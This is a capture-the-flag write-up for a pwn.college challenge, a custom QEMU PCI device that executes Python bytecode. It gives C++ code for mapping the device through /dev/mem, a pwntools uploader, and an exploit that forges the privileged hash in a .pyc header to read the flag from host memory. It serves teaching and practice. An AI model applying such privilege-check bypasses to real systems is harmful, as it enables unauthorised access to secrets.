# Challenge 9

## Description

```
This year, Santa decided you’ve been especially good and left you a shiny new
Python Processing Unit (pypu) — a mysterious PCIe accelerator built to finally
quiet all the elves who won’t stop grumbling that “Python is slow” 🐍💨. This
festive silicon snack happily devours .pyc bytecode at hardware speed… but
Santa forgot to include any userspace tools, drivers, or documentation for how
to actually use it. 🎁 All you’ve got is a bare MMIO interface, a device that
will execute whatever .pyc you can wrangle together, and the hope that you can
coax this strange gift into revealing an extra gift. Time to poke, prod,
reverse-engineer, and see what surprises your new holiday hardware is hiding
under the tree. 🎄✨
```

## Analysis

This challenge spawns a QEMU virtual machine with a custom PCI device attached.
You are root inside the VM, and have to escape to get the flag on the host
system.

It seems like the PCI device accepts python bytecode (pyc files) and executes
them.

```c
static void pypu_pci_realize(PCIDevice *pdev, Error **errp)
{
    PypuPCIState *state = PYPU_PCI(pdev);

    qemu_mutex_init(&state->py_mutex);
    qemu_cond_init(&state->py_cond);
    state->py_thread_alive = true;
    state->work_gen = 0;
    state->done_gen = 0;
    g_autofree char *flag_file = NULL;
    if (g_file_get_contents("/flag", &flag_file, NULL, NULL)) {
        pstrcpy(state->flag, sizeof(state->flag), flag_file);
    }
    qemu_thread_create(&state->py_thread, "pypu-py", python_worker, state,
                       QEMU_THREAD_JOINABLE);

    pci_config_set_vendor_id(pdev->config, 0x1337);
    pci_config_set_device_id(pdev->config, 0x1225);
    pci_config_set_class(pdev->config, PCI_CLASS_OTHERS);

    memory_region_init_io(&state->mmio, OBJECT(pdev), &pypu_mmio_ops, state,
                          "pypu-mmio", 0x1000);
    pci_register_bar(pdev, 0, PCI_BASE_ADDRESS_SPACE_MEMORY, &state->mmio);
    memory_region_init_io(&state->stdout_mmio, OBJECT(pdev), &pypu_stdout_ops, state,
                          "pypu-stdout", sizeof(state->stdout_capture));
    pci_register_bar(pdev, 1, PCI_BASE_ADDRESS_SPACE_MEMORY, &state->stdout_mmio);
    memory_region_init_io(&state->stderr_mmio, OBJECT(pdev), &pypu_stderr_ops, state,
                          "pypu-stderr", sizeof(state->stderr_capture));
    pci_register_bar(pdev, 2, PCI_BASE_ADDRESS_SPACE_MEMORY, &state->stderr_mmio);
}
```

The code reads the flag into memory, creates a background thread that runs
`python_worker`, and registers the device.

### MMIO

This device has 3 mmio regions. One for interacting with the device, and two
for sending out `stdout` and `stderr`.

When we read to the mmio region, we have five options, depending on where we read.
* Reading 4 bytes from address 0x0 returns the bytes `PYPU`.
* Reading 4 bytes from address 0x4 returns the stratch register value.
* Reading 4 bytes from address 0x8 returns the value of `greet_count`;
* Reading 4 bytes from address 0x10 returns the code len.
* Reading a byte from an address between `0x100` and `0x100 + CODE_BUF_SIZE` reads the corresponding byte of the code.

```c
static void pypu_mmio_write(void *opaque, hwaddr addr, uint64_t val,
                             unsigned size)
{
    PypuPCIState *state = opaque;

    if (addr == 0x04 && size == 4) {
        state->scratch = val;
    } else if (addr == 0x0c && size == 4) {
        state->greet_count++;
        qemu_mutex_lock(&state->py_mutex);
        state->work_gen++;
        qemu_cond_signal(&state->py_cond);
        while (state->done_gen != state->work_gen && state->py_thread_alive) {
            qemu_cond_wait(&state->py_cond, &state->py_mutex);
        }
        qemu_mutex_unlock(&state->py_mutex);
    } else if (addr == 0x10 && size == 4) {
        if (val > CODE_BUF_SIZE) {
            val = CODE_BUF_SIZE;
        }
        state->code_len = val;
    } else if (addr >= 0x100 && addr < 0x100 + CODE_BUF_SIZE && size == 1) {
        state->code[addr - 0x100] = (uint8_t)val;
    }
}
```


When we write to the mmio region, we have four options, depending on where we write.

* Writing 4 bytes to address 0x4, stores the value into a scratch variable
* Writing 4 bytes to address 0xc, triggers execution.
* Writing 4 bytes to address 0x10 sets the code size of up to `CODE_BUF_SIZE`.
* Writing a single byte to an address between `0x100` and `0x100 + CODE_BUF_SIZE` stores that byte into the code array.

### Background Worker
The background worker enables the `landlock` LSM, and then waits for new work
to arrive. When new work arrives, it copies the code into a local variable and
executes it.

### Landlock
The landlock code disables accessing anything from the filesystem except the
python3 code (read and execute). Everything else is blocked. We have to rely on
the flag being loaded in memory instead.

### Python Code Execution
The payload that you need to provide has the following properties:

* Bytes `[0, 4)` header magic.
* Bytes `[4, 8)` pyc flags.
* Bytes `[8, 16)` hash
* Bytes `[16, +inf)` the code to be executed.

The header magic has to match the expected one.  If the hash matches the
`PYPU_PRIVILEGED_HASH` (exposed in the header file), the code sets the
`privileged` flag.

The rest of the function sets up the environment and executes the code. There
is some logic to handle the globals, apparently there's a global `gifts` that
is only enabled if you are running in privileged mode. That global contains the
flag.

## VM Setup
We can interact with the VM via the serial console, as in, we can input
commands. The VM has a busybox installation so we are very limited on what we
can do (for example, we can't execute python code or a C/C++ compiler).

VM is run as follows:

```bash
#!/usr/bin/exec-suid -- /bin/bash -p

set -euo pipefail

PATH="/challenge/runtime/qemu/bin:$PATH"

qemu-system-x86_64 \
  -machine q35 \
  -cpu qemu64 \
  -m 512M \
  -nographic \
  -no-reboot \
  -kernel /challenge/runtime/bzImage \
  -initrd /challenge/runtime/rootfs.cpio.gz \
  -append "console=ttyS0 quiet panic=-1" \
  -device pypu-pci \
  -serial stdio \
  -monitor none
```

### Sending our payload to the VM
With `pwntools` we can send commands to the VM and we can use this to put a
statically linked executable into the VM that would interact with the PCI
device in the way that we want.

```python
import pwn
import base64
import itertools
from pathlib import Path

pwn.context.arch = "amd64"

# Encode a gzip encoded payload in base64 and
# split it in chunks of 800 characters.
# so we can send them in individual commands.
payload = Path("payload").read_bytes()
payload_encoded = base64.b64encode(payload)
chunks = itertools.batched(payload_encoded, 800)
print(f"Binary Encoded Len: {len(payload_encoded)}")

with pwn.process("/challenge/run.sh") as target:
    target.recvuntil(b"~ # ")

    # This is super slow, but we send each chunk and wait for
    # the terminal echoing it back to us.
    for chunk in chunks:
        print(f"Sending chunk... of size {len(chunk)}")
        target.sendline(b"echo -n \"" + bytes(chunk) + b"\" >> ./binary_encoded")
        data  = target.recvuntil(b"~ # ")
        print(data.decode())

    # Flexing to make sure that we sent the full binary.
    target.sendline(b"wc -c ./binary_encoded")
    data = target.recvuntil(b"~ # ")
    print(data.decode())

    # Base 64 decode the file into a gzip file.
    target.sendline(b"base64 -d < ./binary_encoded > ./binary.gz")
    data = target.recvuntil(b"~ # ")
    print(data.decode())

    # Decompress the file.
    target.sendline(b"gunzip ./binary.gz")
    data = target.recvuntil(b"~ # ")
    print(data.decode())

    # Make it executable.
    target.sendline(b"chmod ugo+rx ./binary")
    data = target.recvuntil(b"~ # ")
    print(data.decode())

    # Run it!
    target.sendline(b"./binary")
    data = target.recvuntil(b"~ # ")
    print(data.decode())
```

This file can be found in [`challenge9.py`](./challenge9.py)

### Local Development repackaging initramfs
Using the previous mechanism is too slow for testing and iterating on
solutions. Instead, we can modify the rootfs used by the VM in practice
mode to get faster feedback.

We can download `/challenge/runtime/bzImage` (kernel) and
`/challenge/runtime/rootfs.cpio.gz` (intramfs rootfs) and unpack the latter one:

```shell
$ mkdir initramfs_work
$ cd initramfs_work
$ gzip -dc ../rootfs.cpio.gz | cpio -idv
```

And then use the following script to build it and upload it:

```bash
#!/bin/bash

set -e
make challenge9

pushd initramfs_work
cp ../challenge9 .
chmod +x ./challenge9
find . | cpio -o -H newc | gzip > ../rootfs_patched.cpio.gz
popd

scp rootfs_patched.cpio.gz hacker@dojo.pwn.college:~/challenge9/rootfs_patched.cpio.gz
```

Assuming we have a `challenge9.cc` that we want to try out (compiling it
statically and all that).

Note that we need to modify the `run.sh` script to use _our_ rootfs instead of
the original one.

## PCI Interaction
Basically, the way we interact with this PCI device is: we find the memory
ranges for the MMIO registers, we mmap them into memory from `/proc/mem`, and
we write/read from them.

### Finding the right device and addresses
To find the memory ranges, we need to inspect the sysfs filesystem, looking for a device with the right Vendor ID and Device ID

Basically we need to iterate all the folders in `/sys/bus/pci/devices`, and in
each of them, look at the `vendor` and `device` files for the ones used by this
driver `0x1337` and `0x1225` respectively.

After that we open the `resource` file in that same folder, and parse all the
addresses in there. One line per MMIO area, the first number is the start
address in hex, and that's all we need.

Here's a bit of C++ code to parse that:

```c++
struct PCIAddresses {
  uint64_t bar0;
  uint64_t bar1;
  uint64_t bar2;
};

uint32_t read_hex_file(const std::string& path) {
  FILE* f = fopen(path.c_str(), "r");
  if (f == nullptr) {
    err(EXIT_FAILURE, "fopen");
  }
  uint32_t res;
  if (fscanf(f, "%x", &res) != 1) {
    fprintf(stderr, "fscanf read_hex_file\n");
    exit(EXIT_FAILURE);
  }

  fclose(f);
  return res;
}

PCIAddresses find_pypu_device() {
  PCIAddresses addresses = {};
  bool found = false;

  constexpr char kPciPath[] = "/sys/bus/pci/devices";
  DIR* dir = opendir(kPciPath);
  if (dir == nullptr) {
    err(EXIT_FAILURE, "opendir");
  }
  struct dirent* entry;
  while ((entry = readdir(dir)) != nullptr) {
    if (entry->d_name[0] == '.') {
      continue;
    }

    constexpr uint32_t kVendor = 0x1337;
    constexpr uint32_t kDevice = 0x1225;

    const std::string base_path = std::string(kPciPath) + "/" + entry->d_name;

    uint32_t vendor = read_hex_file(base_path + "/vendor");
    uint32_t device = read_hex_file(base_path + "/device");

    if (vendor != kVendor or device != kDevice) {
      continue;
    }
    found = true;
    fprintf(stderr, "[!] Found device at %s\n", base_path.c_str());

    const std::string resource_path = base_path + "/resource";
    FILE* resource = fopen(resource_path.c_str(), "r");
    if (resource == nullptr) {
      err(EXIT_FAILURE, "fopen(resource)");
    }

    fscanf(resource, "%lx %*x %*x\n", &addresses.bar0);
    fscanf(resource, "%lx %*x %*x\n", &addresses.bar2);
    fscanf(resource, "%lx %*x %*x\n", &addresses.bar1);

    fclose(resource);
    break;
  }
  closedir(dir);

  if (!found) {
    fprintf(stderr, "device not found\n");
    exit(EXIT_FAILURE);
  }

  return addresses;
}
```

### Interacting with the device

Now that we have the addresses, we need to map those offsets from `/dev/mem`
into memory and write/read to it with instructions of specific size.

```c++
#define ALWAYS_INLINE __attribute__((always_inline)) inline

ALWAYS_INLINE uint32_t r32(uintptr_t addr) {
	uint32_t result;
	__asm__ volatile("mov (%1), %0\n" : "=r" (result) : "r" (addr) : "memory");
	return result;
}

ALWAYS_INLINE uint8_t r8(uintptr_t addr) {
	uint8_t result;
	__asm__ volatile("movb (%1), %0\n" : "=r" (result) : "r" (addr) : "memory");
	return result;
}

ALWAYS_INLINE void w64(uintptr_t addr, uint64_t val) {
	__asm__ volatile("movq %[val], (%[addr])\n" :: [val] "r" (val), [addr] "r" (addr) : "memory");
}

ALWAYS_INLINE void w32(uintptr_t addr, uint32_t val) {
	__asm__ volatile("mov %[val], (%[addr])\n" :: [val] "r" (val), [addr] "r" (addr) : "memory");
}

ALWAYS_INLINE void w8(uintptr_t addr, uint8_t val) {
	__asm__ volatile("movb %[val], (%[addr])\n" :: [val] "r" (val), [addr] "r" (addr) : "memory");
}

ALWAYS_INLINE void read_buffer(uintptr_t addr, uint8_t* dst,  size_t n) {
	for (size_t i = 0; i < n; i++) {
		dst[i] = r8(addr+i);
	}
}

ALWAYS_INLINE void write_buffer(uintptr_t addr, uint8_t* src, size_t n) {
	for (size_t i = 0; i < n; i++) {
		w8(addr+i, src[i]);
	}
}
```

And the following code can be used to find the addresses, map the devices and write to some registers:

```c++
  PCIAddresses addresses = find_pypu_device();
  fprintf(stderr, "[!] BAR0 start: %lx\n", addresses.bar0);
  fprintf(stderr, "[!] BAR1 start: %lx\n", addresses.bar1);
  fprintf(stderr, "[!] BAR2 start: %lx\n", addresses.bar2);

  int mem_fd = open("/dev/mem", O_RDWR | O_SYNC);
  if (mem_fd == -1) {
	err(EXIT_FAILURE, "open(/dev/mem)");
  }
  constexpr size_t kPageSz = 0x1000;

  void* control_mapping = mmap(nullptr, kPageSz, PROT_READ|PROT_WRITE, MAP_SHARED, mem_fd, addresses.bar0);
  if (control_mapping == MAP_FAILED) {
	err(EXIT_FAILURE, "mmap control_mapping");
  }

  void* stderr_mapping = mmap(nullptr, kPageSz, PROT_READ|PROT_WRITE, MAP_SHARED, mem_fd, addresses.bar1);
  if (stderr_mapping == MAP_FAILED) {
	err(EXIT_FAILURE, "mmap stderr_mapping");
  }

  void* stdout_mapping = mmap(nullptr, kPageSz, PROT_READ|PROT_WRITE, MAP_SHARED, mem_fd, addresses.bar2);
  if (stdout_mapping == MAP_FAILED) {
	err(EXIT_FAILURE, "mmap stdout_mapping");
  }

  const uintptr_t stderr_base = reinterpret_cast<uintptr_t>(stderr_mapping);
  const uintptr_t stdout_base = reinterpret_cast<uintptr_t>(stderr_mapping);
  const uintptr_t control_base = reinterpret_cast<uintptr_t>(control_mapping);

  const uintptr_t scratch_addr = control_base + 0x4;
  const uintptr_t greet_count_addr = control_base + 0x8;
  const uintptr_t trigger_addr = control_base + 0xc;
  const uintptr_t codelen_addr = control_base + 0x10;
  const uintptr_t codebuf_addr = control_base + 0x100;

  uint32_t header = r32(control_base);
  fprintf(stderr, "read header: %.4s\n", reinterpret_cast<char*>(&header));

  w32(scratch_addr, 0xdeadbeef);
  uint32_t scratch = r32(scratch_addr);
  fprintf(stderr, "read scratch: %x\n", scratch);

  close(mem_fd);
  munmap(control_mapping, kPageSz);
  munmap(stdout_mapping, kPageSz);
  munmap(stderr_mapping, kPageSz);
```

## Exploit
To solve this challenge we know we need to run our custom python code, and
leaking the flag that way.

### Compiling python
The following code can be used to compile a single python script into a `pyc`
file, suitable for executing with this PCI device. The code also emits it as a
C `uint8_t` array, ready for add it as a shellcode in our program.

```python
#!/usr/bin/python3

import py_compile
from pathlib import Path

py_file = Path("hello_world.py")
pyc_file = Path("hello_world.pyc")
py_compile.compile(py_file, cfile=pyc_file)

data = pyc_file.read_bytes()

print("uint8_t payload[] = {" + ", ".join(f"0x{b:02x}" for b in data) + "};")
print(f"unsigned int payload_len = {len(data)};")
```

Let's see how a simple hello, world would look like:

```shell
$ cat hello_world.py 
print("Hello compiled world")
$ uv run ./challenge9_compile.py 
uint8_t payload[] = {0xf3, 0x0d, 0x0d, 0x0a, 0x00, 0x00, 0x00, 0x00, 0xee, 0x80, 0x3f, 0x69, 0x1e, 0x00, 0x00, 0x00, 0xe3, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xf3, 0x14, 0x00, 0x00, 0x00, 0x95, 0x00, 0x5c, 0x00, 0x22, 0x00, 0x53, 0x00, 0x35, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x67, 0x01, 0x29, 0x02, 0x7a, 0x14, 0x48, 0x65, 0x6c, 0x6c, 0x6f, 0x20, 0x63, 0x6f, 0x6d, 0x70, 0x69, 0x6c, 0x65, 0x64, 0x20, 0x77, 0x6f, 0x72, 0x6c, 0x64, 0x4e, 0x29, 0x01, 0xda, 0x05, 0x70, 0x72, 0x69, 0x6e, 0x74, 0xa9, 0x00, 0xf3, 0x00, 0x00, 0x00, 0x00, 0xda, 0x0e, 0x68, 0x65, 0x6c, 0x6c, 0x6f, 0x5f, 0x77, 0x6f, 0x72, 0x6c, 0x64, 0x2e, 0x70, 0x79, 0xda, 0x08, 0x3c, 0x6d, 0x6f, 0x64, 0x75, 0x6c, 0x65, 0x3e, 0x72, 0x06, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x73, 0x0e, 0x00, 0x00, 0x00, 0xf0, 0x03, 0x01, 0x01, 0x01, 0xd9, 0x00, 0x05, 0xd0, 0x06, 0x1c, 0xd5, 0x00, 0x1d, 0x72, 0x04, 0x00, 0x00, 0x00};
unsigned int payload_len = 162;
```

And now let's edit our code to use the payload:

```c++
  write_buffer(codebuf_addr, payload, payload_len);
  w32(codelen_addr, payload_len);

  w32(trigger_addr, 1);

  uint32_t greet_count = r32(greet_count_addr);
  fprintf(stderr, "greet_count: %u\n", greet_count);

  uint8_t buf[kPageSz] = {0};
  read_buffer(stderr_base, buf, kPageSz);
  fprintf(stderr, "stderr: %s\n", reinterpret_cast<char*>(buf));

  read_buffer(stdout_base, buf, kPageSz);
  fprintf(stderr, "stderr: %s\n", reinterpret_cast<char*>(buf));
```

And this is what we get...

```shell
~ # ./challenge9
[!] Found device at /sys/bus/pci/devices/0000:00:03.0
[!] BAR0 start: febd5000
[!] BAR1 start: febd7000
[!] BAR2 start: febd6000
read header: UPYP
read scratch: deadbeef
greet_count: 1
stderr: Hello compiled world

stderr: Hello compiled world
```

### Patching

Now, we know that the sandbox checks whether the program is privileged by
looking at the hash of the pyc file. We just have to replace that hash with the
one in the header challenge and we are done.

```c++
constexpr uint64_t kPrivilegedHash = 0xf0a0101a75bc9dd3ULL;
w64(reinterpret_cast<uintptr_t>(payload) + 8, kPrivilegedHash);
```

### Flag Printer

The `pypu_get_globals` handles how globals are managed in the python
environment. The flag is in the `gifts` module, but it is only available if we
are running in privileged mode.

```c
    if (!state->gifts_module) {
        PyObject *gifts_module = PyModule_New("gifts");
        if (!gifts_module) {
            PyErr_Print();
            return NULL;
        }
        PyObject *flag_val = PyUnicode_FromString(state->flag);
        if (!flag_val) {
            PyErr_Print();
            Py_DECREF(gifts_module);
            return NULL;
        }
        if (PyModule_AddObject(gifts_module, "flag", flag_val) < 0) {
            PyErr_Print();
            Py_DECREF(flag_val);
            Py_DECREF(gifts_module);
            return NULL;
        }
        state->gifts_module = gifts_module;
    }

    // (...)

    if (privileged) {
        if (PyDict_SetItemString(modules, "gifts", state->gifts_module) < 0) {
            PyErr_Print();
            Py_DECREF(modules);
            Py_DECREF(sys_module);
            return NULL;
        }
    } else {
        if (PyDict_DelItemString(state->globals_dict, "gifts") < 0) {
            PyErr_Clear();
        }
        if (PyDict_DelItemString(modules, "gifts") < 0) {
            PyErr_Clear();
        }
    }
```

So we just need to have a script that prints the `flag` variable from the `gifts` module:

```python
import gifts
print(gifts.flag)
```

Set it as privileged, and run that.

```shell
$ cat hello_world.py
$ uv run ./challenge9_compile.py 
uint8_t payload[] = {0xf3, 0x0d, 0x0d, 0x0a, 0x00, 0x00, 0x00, 0x00, 0x3d, 0x84, 0x3f, 0x69, 0x1f, 0x00, 0x00, 0x00, 0xe3, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xf3, 0x30, 0x00, 0x00, 0x00, 0x95, 0x00, 0x53, 0x00, 0x53, 0x01, 0x4b, 0x00, 0x72, 0x00, 0x5c, 0x01, 0x22, 0x00, 0x5c, 0x00, 0x52, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x35, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x67, 0x01, 0x29, 0x02, 0xe9, 0x00, 0x00, 0x00, 0x00, 0x4e, 0x29, 0x03, 0xda, 0x05, 0x67, 0x69, 0x66, 0x74, 0x73, 0xda, 0x05, 0x70, 0x72, 0x69, 0x6e, 0x74, 0xda, 0x04, 0x66, 0x6c, 0x61, 0x67, 0xa9, 0x00, 0xf3, 0x00, 0x00, 0x00, 0x00, 0xda, 0x0e, 0x68, 0x65, 0x6c, 0x6c, 0x6f, 0x5f, 0x77, 0x6f, 0x72, 0x6c, 0x64, 0x2e, 0x70, 0x79, 0xda, 0x08, 0x3c, 0x6d, 0x6f, 0x64, 0x75, 0x6c, 0x65, 0x3e, 0x72, 0x09, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x73, 0x14, 0x00, 0x00, 0x00, 0xf0, 0x03, 0x01, 0x01, 0x01, 0xdb, 0x00, 0x0c, 0xd9, 0x00, 0x05, 0x80, 0x65, 0x87, 0x6a, 0x81, 0x6a, 0xd5, 0x00, 0x11, 0x72, 0x07, 0x00, 0x00, 0x00};
unsigned int payload_len = 192;
```

Adding the payload to [`./challenge9.cc`](./challenge9.cc)

```shell
$ ./build_rootfs.sh 
clang++ -Wall -Wextra -pedantic -std=c++23 -Oz -g0  -static  challenge9.cc   -o challenge9
~/code/adventofpwn2025/challenge9/initramfs_work ~/code/adventofpwn2025/challenge9
6904 blocks
~/code/adventofpwn2025/challenge9
rootfs_patched.cpio.gz                        
```

And then from the vm:

```shell
~ # ./challenge9 
[!] Found device at /sys/bus/pci/devices/0000:00:03.0
[!] BAR0 start: febd5000
[!] BAR1 start: febd7000
[!] BAR2 start: febd6000
read header: UPYP
read scratch: deadbeef
greet_count: 1
stderr: 
stdout: pwn.college{practice}


~ # 
```

Now we can use it with the real vm as well:

```shell
hacker@2025~day-09:~/challenge9$ gzip -c ./challenge9 > payload
hacker@2025~day-09:~/challenge9$ python3 ./challenge9.py 
Binary Encoded Len: 627736
[+] Starting local process '/challenge/run.sh': pid 145
Sending chunk... of size 800
echo -n "/umpYb4byeG7FIsB5CuY255mNE71t+O5vnH2EsBvgOZEgXdXewC0Vmy0xKR/bUO78wG
OWQhnuoBe3YqBD3HVgwrjRbvTGg/e3Yuhn5F6JfdE6iUqJWbREeaXnJGsq/ot4d6xeMlmCQOMC441s4Y
jymO4Q2Vuu+A4OStPLmrnN4bqH/4Je2sD1v9jEmJpDays33RkxJssAUFSObymYjXo6LUeaahzFdI3wdH
m68Xo2zr32Y3OwD4gbzWpxsirTyFv60kyHQfaouN7PvA5kkgicUCTdOo2E1cGUbdx9imI+0XYh4mI/QK
SuCwkcYVxJC6DKJqvBD+YKbCY7RiJBJfqLI6RuM+RO8nD7JhT4oZKbVqFQY+ci9Hnq5D1GUbmRtHVuQr
FLD54LelddNOjNTyQlQ90Wnz/csHU3Qrzgb3Fu0PhLVDHHsmMOs6NtwwnkyxP2Cg1nLr/xvhjrtQQ2A0
1mCnQHwMfslJhajPIh4LUWthYY/aPAF14lj087N/6N3Xhn6nAPwuBf7p6JuPXOv+8Hqa59GFzKb90Jcc
4qQc4qVNnpU6dlzp1Zgq/ETk3sK+ZYCflapMxth/QbhxsCaIlxxFEtINoqY7ScCHZZy/BAI734Z2RbqZ
hAdEfCsg6O0O7n8P7Q88U4FVgHUPgCYT7C81e6bBXcQOOtvJL8MCyU/a28xtCGx6uMxAVFXdnYzUg6tc
xRE3lwp8SvT5DI0jinEst2hg6sEfzDI9xM6zd0BGD947TEms+xKLxJM7qIY5uoJjokhhBQYKN2FqIHRE
Alw3dD80F0Wvg" >> ./binary_encoded
(...)
~ # 
wc -c ./binary_encoded
627736 ./binary_encoded
~ # 
base64 -d < ./binary_encoded > ./binary.gz
~ # 
gunzip ./binary.gz
~ # 
chmod ugo+rx ./binary
~ # 
./binary
[!] Found device at /sys/bus/pci/devices/0000:00:03.0
[!] BAR0 start: febd5000
[!] BAR1 start: febd7000
[!] BAR2 start: febd6000
read header: UPYP
read scratch: deadbeef
greet_count: 1
stderr: 
stdout: pwn.college{...}
```
